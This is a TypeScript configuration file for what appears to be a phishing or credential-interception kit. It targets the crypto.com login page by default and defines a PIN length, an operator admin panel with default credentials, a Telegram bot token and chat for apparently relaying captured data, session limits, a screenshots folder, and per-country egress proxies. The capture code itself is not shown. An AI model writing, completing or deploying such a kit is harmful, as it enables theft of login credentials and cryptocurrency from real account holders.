import 'dotenv/config';

export const cfg = {
  baseDomain: process.env.BASE_DOMAIN ?? 'http://localhost:3000',
  entry: process.env.TARGET_ENTRY ?? 'https://crypto.com/account/login',
  pinLength: Number(process.env.PIN_LENGTH ?? 4),
  port: Number(process.env.PORT ?? 3000),
  adminPath: process.env.ADMIN_PATH ?? '/ops',
  adminUser: process.env.ADMIN_USER ?? 'ops',
  adminPass: process.env.ADMIN_PASS ?? 'changeme',
  tgToken: process.env.TELEGRAM_TOKEN ?? '',
  tgChat: process.env.TELEGRAM_CHAT ?? '',
  ttl: Number(process.env.SESSION_TTL_MS ?? 900_000),
  maxSessions: Number(process.env.MAX_SESSIONS ?? 60),
  shots: process.env.SHOTS_DIR ?? './shots',
};

export function egressFor(cc?: string): string | undefined {
  if (!cc) return undefined;
  return process.env[`EGRESS_PROXY_${cc.toUpperCase()}`] || undefined;
}